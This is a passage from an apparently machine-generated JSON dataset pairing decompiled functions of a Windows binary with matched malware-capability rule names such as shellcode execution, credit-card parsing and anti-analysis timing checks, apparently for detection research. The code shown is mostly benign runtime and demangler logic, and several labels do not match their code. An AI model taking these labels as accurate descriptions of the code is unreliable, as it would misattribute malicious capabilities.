*(auStack224 + iVar10) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar11);\n    return piVar9;\n}\n",
        "token_count": 4201
    },
    "0040b000": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.0040b000(ulong *arg1)\n\n{\n    ulong *apuStackX8 [4];\n    \n    apuStackX8[0] = arg1;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0x22474343, 0, 1, apuStackX8);\n    (*apuStackX8[0][2])(1, 0x1a, *apuStackX8[0], apuStackX8[0], 0, apuStackX8[0][6]);\n    return 0x10;\n}\n",
        "token_count": 130
    },
    "00412bd0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00412bd0(int64_t *arg1)\n\n{\n    uint *arg4;\n    uint *puVar1;\n    uint *arg4_00;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0x16;\n    if ((arg1 != NULL) && (puVar2 = *arg1,  puVar2 != NULL)) {\n        if (puVar2 == 0xffffffffffffffff) {\n            if (*0x434a70 == 0) {\n                *0x434a70 = fcn.00410a00(\"cond_locked_shmem_cond\", 0x10, 0x412320);\n            }\n            fcn.00410db0(*0x434a70);\n            iVar4 = 0x10;\n            if (*arg1 == -1) {\n                *arg1 = 0;\n                iVar4 = 0;\n            }\n            if (*0x434a70 == 0) {\n                *0x434a70 = fcn.00410a00(\"cond_locked_shmem_cond\", 0x10, 0x412320);\n            }\n            fcn.00410d10(*0x434a70);\n            return iVar4;\n        }\n        arg4_00 = puVar2 + 0x26;\n        arg4 = puVar2 + 0x1c;\n        iVar4 = fcn.00412b40(*(puVar2 + 0x2a), 0, 0xffffffff, arg4);\n        if (iVar4 == 0) {\n            puVar1 = puVar2 + 6;\n            iVar4 = (*_sym.imp.KERNEL32.dll_TryEnterCriticalSection)(puVar1);\n            if (iVar4 == 0) {\n                iVar4 = 0x10;\n                fcn.00412340(*(puVar2 + 0x2a), 1, arg4, arg4_00);\n            }\n            else if ((puVar2[2] == puVar2[4] || puVar2[2] < puVar2[4]) && (iVar4 = puVar2[1],  iVar4 == 0)) {\n                *arg1 = 0;\n                fcn.00412340(*(puVar2 + 0x2a), 1, arg4, arg4_00);\n                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar2 + 0x28));\n                (*pcVar3)(*(puVar2 + 0x2a));\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n                pcVar3 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(puVar1);\n                (*pcVar3)(arg4);\n                (*pcVar3)(puVar2 + 0x10);\n                *puVar2 = 0xc0deadbf;\n                sub.msvcrt.dll_free(puVar2);\n            }\n            else {\n                iVar4 = fcn.00412340(*(puVar2 + 0x2a), 1, arg4, arg4_00);\n                if (iVar4 == 0) {\n                    iVar4 = 0x10;\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n            }\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 758
    },
    "00412dd0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00412dd0(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    piVar2 = *arg1;\n    if (piVar2 == NULL) {\n        return 0x16;\n    }\n    if (piVar2 == 0xffffffffffffffff) {\n        return 0;\n    }\n    if (*piVar2 != -0x3f454e03) {\n        return 0x16;\n    }\n    piVar1 = piVar2 + 6;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(piVar1);\n    if (piVar2[3] == 0) {\n        if (piVar2[2] == piVar2[4] || piVar2[2] < piVar2[4]) goto code_r0x00412ec0;\n        iVar3 = fcn.00412b40(*(piVar2 + 0x2a), 1, 0xffffffff, piVar2 + 0x1c);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n            fcn.0040eac0();\n            return iVar3;\n        }\n        iVar3 = piVar2[4];\n        iVar4 = piVar2[2];\n        if (iVar3 != 0) {\n            piVar2[4] = 0;\n            iVar4 = iVar4 - iVar3;\n        }\n        piVar2[3] = 1;\n        piVar2[2] = iVar4 + -1;\n    }\n    else {\n        if (piVar2[2] == 0) {\ncode_r0x00412ec0:\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n            fcn.0040eac0();\n            return 0;\n        }\n        piVar2[2] = piVar2[2] + -1;\n        piVar2[3] = piVar2[3] + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n    iVar3 = fcn.00412340(*(piVar2 + 0x28), 1, piVar2 + 0x10, piVar2 + 0x1a);\n    fcn.0040eac0();\n    return iVar3;\n}\n",
        "token_count": 562
    },
    "00413010": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00413010(int32_t **arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    ulong *puVar2;\n    int64_t *piVar3;\n    int32_t *piVar4;\n    uint32_t uStack108;\n    int32_t *piStack104;\n    ulong uStack96;\n    uint32_t *puStack88;\n    code *pcStack72;\n    int32_t **ppiStack64;\n    ulong uStack56;\n    \n    fcn.0040eac0();\n    uVar1 = 0x16;\n    if ((arg1 != NULL) && (piVar4 = *arg1,  piVar4 != NULL)) {\n        if (piVar4 == 0xffffffffffffffff) {\n            uVar1 = fcn.00412790(arg1);\n            uStack108 = uVar1;\n            if ((uVar1 & 0xffffffef) != 0) {\n                return uVar1;\n            }\n            piVar4 = *arg1;\n        }\n        else if (*piVar4 != -0x3f454e03) {\n            return 0x16;\n        }\n        uVar1 = fcn.00412b40(*(piVar4 + 0x2a), 0, 0xffffffff, piVar4 + 0x1c);\n        uStack108 = uVar1;\n        if (uStack108 == 0) {\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(piVar4 + 6);\n            piVar4[2] = piVar4[2] + 1;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar4 + 6);\n            uVar1 = fcn.00412340(*(piVar4 + 0x2a), 1, piVar4 + 0x1c, piVar4 + 0x26);\n            uStack108 = uVar1;\n            if (uStack108 == 0) {\n                puStack88 = &uStack108;\n                pcStack72 = 0x413180;\n                ppiStack64 = &piStack104;\n                piStack104 = piVar4;\n                uStack96 = arg2;\n                puVar2 = fcn.0040e710();\n                uStack56 = *puVar2;\n                piVar3 = fcn.0040e710();\n                *piVar3 = &pcStack72;\n                uStack108 = fcn.00410100(arg2);\n                if (uStack108 == 0) {\n                    uStack108 = fcn.00412b40(*(piVar4 + 0x28), 0, 0xffffffff, piVar4 + 0x10);\n                }\n                puVar2 = fcn.0040e710();\n                *puVar2 = uStack56;\n                (*pcStack72)(ppiStack64);\n                uVar1 = uStack108;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 654
    },
    "004132c0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.004132c0(int32_t **arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    ulong *puVar2;\n    int64_t *piVar3;\n    int32_t *piVar4;\n    uint64_t arg3_00;\n    uint32_t uStack108;\n    int32_t *piStack104;\n    ulong uStack96;\n    uint32_t *puStack88;\n    code *pcStack72;\n    int32_t **ppiStack64;\n    ulong uStack56;\n    \n    fcn.0040eac0();\n    uVar1 = 0x16;\n    if ((arg1 != NULL) && (piVar4 = *arg1,  piVar4 != NULL)) {\n        if (piVar4 == 0xffffffffffffffff) {\n            uVar1 = fcn.00412790(arg1);\n            uStack108 = uVar1;\n            if ((uVar1 & 0xffffffef) != 0) {\n                return uVar1;\n            }\n            piVar4 = *arg1;\n        }\n        else if (*piVar4 != -0x3f454e03) {\n            return 0x16;\n        }\n        uVar1 = fcn.004122b0(arg3);\n        arg3_00 = uVar1 & 0xffffffff;\n        if (0xfffffffe < uVar1) {\n            arg3_00 = 0xffffffff;\n        }\n        uVar1 = fcn.00412b40(*(piVar4 + 0x2a), 0, 0xffffffff, piVar4 + 0x1c);\n        uStack108 = uVar1;\n        if (uStack108 == 0) {\n            piVar4[2] = piVar4[2] + 1;\n            uVar1 = fcn.00412340(*(piVar4 + 0x2a), 1, piVar4 + 0x1c, piVar4 + 0x26);\n            uStack108 = uVar1;\n            if (uStack108 == 0) {\n                puStack88 = &uStack108;\n                pcStack72 = 0x413180;\n                ppiStack64 = &piStack104;\n                piStack104 = piVar4;\n                uStack96 = arg2;\n                puVar2 = fcn.0040e710();\n                uStack56 = *puVar2;\n                piVar3 = fcn.0040e710();\n                *piVar3 = &pcStack72;\n                uStack108 = fcn.00410100(arg2);\n                if (uStack108 == 0) {\n                    uStack108 = fcn.00412b40(*(piVar4 + 0x28), 0, arg3_00, piVar4 + 0x10);\n                }\n                puVar2 = fcn.0040e710();\n                *puVar2 = uStack56;\n                (*pcStack72)(ppiStack64);\n                uVar1 = uStack108;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 683
    },
    "004101e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong fcn.004101e0(ulong *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    \n    uVar3 = fcn.0040fc60(arg1);\n    if (uVar3 == 0) {\n        puVar4 = sub.msvcrt.dll_calloc(1);\n        uVar3 = 0xc;\n        if (puVar4 != NULL) {\n            puVar4[2] = 0;\n            puVar4[3] = 0;\n            if ((arg2 == NULL) || (uVar1 = *arg2,  puVar4[2] = uVar1 & 3,  (uVar1 & 4) == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreA)(0, 1, 0x7fffffff, 0);\n                *(puVar4 + 6) = iVar5;\n                if (iVar5 != 0) {\n                    *puVar4 = 0xbab1f00d;\n                    *arg1 = puVar4;\n                    return 0;\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar3 = 0xc;\n                if (iVar2 == 5) {\n                    uVar3 = 1;\n                }\n            }\n            else {\n                uVar3 = 0x28;\n            }\n            *puVar4 = 0xdeadbeef;\n            sub.msvcrt.dll_free(puVar4);\n            *arg1 = 0;\n            return uVar3;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 383
    },
    "00410980": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint64_t fcn.00410980(ulong noname_0, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    if (arg3 - arg4 < 0x40) {\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetAtomNameA)(noname_0, arg2);\n    if (iVar3 != 0) {\n        iVar5 = 0;\n        uVar4 = 0;\n        do {\n            while (*(arg4 + arg2 + iVar5) == 'A') {\n                cVar2 = iVar5;\n                iVar5 = iVar5 + 1;\n                uVar4 = uVar4 | 1 << (-cVar2 & 0x1fU);\n                if (iVar5 == 0x40) {\n                    return uVar4;\n                }\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 != 0x40);\n        return uVar4;\n    }\n    pcVar1 = swi(3);\n    uVar4 = (*pcVar1)();\n    return uVar4;\n}\n",
        "token_count": 302
    },
    "00413660": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.00413660(uint8_t *arg1, uint64_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = 0;\n    uVar3 = 0;\n    do {\n        uVar1 = *arg1;\n        uVar2 = uVar3;\n        uVar3 = uVar3 + 7;\n        uVar4 = uVar4 | (uVar1 & 0x7f) << (uVar2 & 0x3f);\n        arg1 = arg1 + 1;\n    } while (uVar1 < '\\0');\n    if ((uVar3 < 0x40) && ((uVar1 & 0x40) != 0)) {\n        uVar4 = uVar4 | -1 << (uVar3 & 0x3f);\n    }\n    *arg2 = uVar4;\n    return;\n}\n",
        "token_count": 224
    },
    "004137f0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.004137f0(int64_t arg1, uint8_t *arg2, ulong *arg3)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    uint8_t *puVar4;\n    uint8_t uVar6;\n    uint64_t uVar7;\n    uint8_t *puVar5;\n    \n    uVar3 = 0;\n    if (arg1 != 0) {\n        uVar3 = fcn.0040b0f0(arg1);\n    }\n    *arg3 = uVar3;\n    uVar6 = *arg2;\n    if (uVar6 == 0xff) {\n        arg3[1] = uVar3;\n        uVar6 = arg2[1];\n        arg2 = arg2 + 2;\n        *(arg3 + 5) = uVar6;\n    }\n    else {\n        uVar3 = fcn.00413960(uVar6, arg1);\n        arg2 = fcn.00413a20(uVar6, uVar3, arg2 + 1, arg3 + 1);\n        uVar6 = *arg2;\n        arg2 = arg2 + 1;\n        *(arg3 + 5) = uVar6;\n    }\n    if (uVar6 == 0xff) {\n        arg3[3] = 0;\n    }\n    else {\n        uVar7 = 0;\n        uVar6 = 0;\n        puVar5 = arg2;\n        do {\n            arg2 = puVar5 + 1;\n            uVar1 = *puVar5;\n            uVar2 = uVar6 & 0x3f;\n            uVar6 = uVar6 + 7;\n            uVar7 = uVar7 | (uVar1 & 0x7f) << uVar2;\n            puVar5 = arg2;\n        } while (uVar1 < '\\0');\n        arg3[3] = arg2 + uVar7;\n    }\n    uVar7 = 0;\n    uVar6 = 0;\n    *(arg3 + 0x29) = *arg2;\n    puVar5 = arg2 + 1;\n    do {\n        puVar4 = puVar5 + 1;\n        uVar1 = *puVar5;\n        uVar2 = uVar6 & 0x3f;\n        uVar6 = uVar6 + 7;\n        uVar7 = uVar7 | (uVar1 & 0x7f) << uVar2;\n        puVar5 = puVar4;\n    } while (uVar1 < '\\0');\n    arg3[4] = puVar4 + uVar7;\n    return;\n}\n",
        "token_count": 604
    },
    "004138e0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong fcn.004138e0(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    uint8_t uVar4;\n    uint64_t arg2_00;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    ulong auStackX24 [2];\n    \n    puVar5 = ~arg4 + *(arg1 + 0x18);\n    auStackX24[0] = arg3;\n    while( true ) {\n        arg2_00 = 0;\n        uVar4 = 0;\n        puVar6 = puVar5;\n        do {\n            puVar5 = puVar6 + 1;\n            uVar1 = *puVar6;\n            uVar2 = uVar4 & 0x3f;\n            uVar4 = uVar4 + 7;\n            arg2_00 = arg2_00 | (uVar1 & 0x7f) << uVar2;\n            puVar6 = puVar5;\n        } while (uVar1 < '\\0');\n        if (arg2_00 == 0) break;\n        uVar3 = fcn.00413700(arg1, arg2_00);\n        uVar3 = fcn.00413790(uVar3, arg2, auStackX24);\n        if (uVar3 != '\\0') {\n            return uVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 340
    },
    "00401cf0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00401cf0(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *(arg1 + 0x100);\n    if (iVar1 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        iVar2 = 1;\n        iVar1 = 0;\n    }\n    else {\n        iVar2 = iVar1 + 1;\n    }\n    *(arg1 + 0x100) = iVar2;\n    *(arg1 + iVar1) = arg2;\n    *(arg1 + 0x108) = arg2;\n    return;\n}\n",
        "token_count": 198
    },
    "00401dd0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint * fcn.00401dd0(int64_t arg1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = *(arg1 + 0x28);\n    if (iVar2 < *(arg1 + 0x2c)) {\n        *(arg1 + 0x28) = iVar2 + 1;\n        puVar1 = *(arg1 + 0x20) + iVar2 * 0x18;\n        if (puVar1 != NULL) {\n            *puVar1 = 0x40;\n            uVar3 = fcn.00401d60(arg1 + 0x18);\n            puVar1[2] = uVar3;\n            return puVar1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 176
    },
    "00401e70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint * fcn.00401e70(int64_t arg1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (**(arg1 + 0x18) == 'T') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n        iVar3 = fcn.00401e20(arg1);\n        if (-1 < iVar3) {\n            *(arg1 + 0x40) = *(arg1 + 0x40) + 1;\n            iVar2 = *(arg1 + 0x28);\n            if (iVar2 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar2 + 1;\n                puVar1 = *(arg1 + 0x20) + iVar2 * 0x18;\n                if (puVar1 != NULL) {\n                    puVar1[2] = iVar3;\n                    *puVar1 = 5;\n                    return puVar1;\n                }\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 246
    },
    "00401ee0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00401ee0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    \n    if (**(arg1 + 0x18) != '_') {\n        return 1;\n    }\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    uVar1 = fcn.00401d60(arg1 + 0x18);\n    return ~uVar1 >> 0x1f;\n}\n",
        "token_count": 108
    },
    "004033c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401850)\n\nulong fcn.004033c0(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    if (**(arg1 + 0x18) == 'J') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    }\n    else {\n        iVar3 = 0;\n        if (arg2 == 0) goto code_r0x004033d8;\n    }\n    iVar3 = fcn.00402960(arg1);\n    if (iVar3 == 0) {\n        return 0;\n    }\ncode_r0x004033d8:\n    iVar2 = fcn.004032d0(arg1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    // WARNING: Could not recover jumptable at 0x004017f7. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (*(*0x42d304 + 0x42d260))(arg1, 0x29, iVar3, iVar2);\n    return uVar1;\n}\n",
        "token_count": 275
    },
    "00404790": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nchar ******** fcn.00404790(uchar *arg1, ulong arg2, char ********arg3)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    char ********ppppppppcVar8;\n    char ********ppppppppcVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uint64_t arg2_00;\n    char ********ppppppppcVar13;\n    char ******ppppppcVar14;\n    char ********ppppppppcVar15;\n    char *******pppppppcVar16;\n    char *pcVar17;\n    uchar *puVar18;\n    char ******ppppppcVar19;\n    char *****pppppcVar20;\n    char *****pppppcVar21;\n    char *******pppppppcVar22;\n    char cVar23;\n    int32_t iVar24;\n    uint8_t *puVar25;\n    int32_t iVar26;\n    char *******pppppppcVar27;\n    uchar uVar28;\n    bool bVar29;\n    uchar uVar30;\n    char ********ppppppppcStack216;\n    char *******pppppppcStack208;\n    char ********appppppppcStack200 [2];\n    int32_t *piStack184;\n    char *******apppppppcStack176 [3];\n    int32_t *apiStack152 [11];\n    \n    uVar6 = *arg3;\n    ppppppppcVar9 = uVar6;\n    arg2_00 = arg2;\n    if (0x4b < uVar6) {\ncode_r0x00406473:\n        *(arg1 + 0x130) = 1;\n        return ppppppppcVar9;\n    }\n    // switch table (76 cases) at 0x42db34\n    switch(*(uVar6 * 4 + 0x42db34) + 0x42db34) {\n    case 0x4047d0:\ncode_r0x004047d0:\n        appppppppcStack200[0] = *(arg1 + 0x128);\ncode_r0x004047d7:\n        *(arg1 + 0x128) = appppppppcStack200;\n        apppppppcStack176[0] = *(arg1 + 0x120);\n        appppppppcStack200[1] = arg3;\ncode_r0x00404801:\n        pppppppcVar22 = appppppppcStack200[1][1];\ncode_r0x00404805:\n        ppppppppcVar9 = appppppppcStack200[1];\n        piStack184._0_4_ = 0;\n        fcn.00407f90(arg1, arg2_00, pppppppcVar22);\n        if (piStack184 == 0) {\n            fcn.00407fc0(arg1, arg2, ppppppppcVar9);\n        }\n        *(arg1 + 0x128) = appppppppcStack200[0];\n        ppppppppcVar9 = appppppppcStack200[0];\n        break;\n    case 0x404844:\n        appppppppcStack200[0] = *(arg1 + 0x128);\n        ppppppppcVar9 = appppppppcStack200[0];\n        if (appppppppcStack200[0] == NULL) {\n            appppppppcStack200[0] = NULL;\n        }\n        else {\n            do {\n                if (*(ppppppppcVar9 + 2) == 0) {\n                    if (2 < *ppppppppcVar9[1] - 0x19) break;\n                    if (uVar6 == *ppppppppcVar9[1]) {\n                        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n                        return ppppppppcVar9;\n                    }\n                }\n                ppppppppcVar9 = *ppppppppcVar9;\n            } while (ppppppppcVar9 != NULL);\n        }\n        goto code_r0x004047d7;\n    case 0x404890:\n        uVar6 = *(arg3 + 2);\n        pppppppcVar22 = arg3[1];\n        if (uVar6 != 0) {\n            ppppppppcVar15 = *(arg1 + 0x100);\n            iVar11 = 1;\n            do {\n                uVar28 = *(pppppppcVar22 + iVar11 + -1);\n                if (ppppppppcVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppppppppcVar9 = NULL;\n                    ppppppppcVar15 = 0x1;\n                }\n                else {\n                    ppppppppcVar9 = ppppppppcVar15;\n                    ppppppppcVar15 = ppppppppcVar15 + 1;\n                }\n                iVar11 = iVar11 + 1;\n                *(arg1 + 0x100) = ppppppppcVar15;\n                arg1[ppppppppcVar9] = uVar28;\n                arg1[0x108] = uVar28;\n            } while (iVar11 != uVar6 + 1);\n        }\n        break;\n    case 0x404910:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"hidden alias for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404990:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"TLS wrapper function for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404a10:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"reference temporary #\";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        pcVar17 = \" for \";\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        iVar11 = *(arg1 + 0x100);\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404a90:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"TLS init function for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404b10:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"guard variable for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404b90:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"covariant return thunk to \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404c10:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"java Class for \";\n        do {\n            cVar23 